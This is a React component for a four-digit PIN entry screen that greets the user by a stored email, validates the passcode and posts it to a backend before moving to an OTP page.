import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  pin: yup
    .string()
    .matches(/^\d{4}$/, "PIN must be exactly 4 digits")
    .required("PIN is required"),
});

const Pin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState(new Array(4).fill(""));
  const [userEmail, setUserEmail] = useState("");
  const [loading, setLoading] = useState(false);

  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  useEffect(() => {
    const storedEmail = localStorage.getItem("email");
    if (storedEmail) setUserEmail(storedEmail);
  }, []);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    if (index < 3 && value !== "") {
      document.getElementById(`pin-${index + 1}`).focus();
    }

    setValue("pin", newPin.join(""));
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/pin`, data)
      .then(() => {
        navigate("/otp");
      })
      .catch((error) => {
        console.error("PIN verification error", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen flex items-start  justify-center bg-white text-black">
      <div className="w-full max-w-md px-6 pt-36 text-center space-y-6">
        <h1 className="text-xl font-medium">
          Welcome back, <span className="font-bold">{userEmail}</span>
        </h1>
        <p className="text-sm text-gray-600">Enter your 4-digit passcode</p>

        <form onSubmit={handleSubmit(submitForm)} className="space-y-6">
          <div className="flex justify-center space-x-4">
            {pin.map((data, index) => (
              <input
                key={index}
                id={`pin-${index}`}
                type="password"
                name="pin"
                maxLength="1"
                value={data}
                onChange={(e) => handleChange(e.target, index)}
                onFocus={(e) => e.target.select()}
                className="w-12 h-12 rounded-full bg-gray-100 text-black text-center text-xl outline-none focus:ring-2 focus:ring-white"
                inputMode="numeric"
                pattern="[0-9]*"
                autoComplete="off"
              />
            ))}
          </div>

          <FormErrMsg errors={errors} inputName="pin" />

          <button
            type="submit"
            disabled={loading}
            className="w-full py-3 mt-[5em] bg-green-700 hover:bg-green-800 text-white rounded-full font-semibold  transition"
          >
            {loading ? "Loading..." : "Confirm"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default Pin;
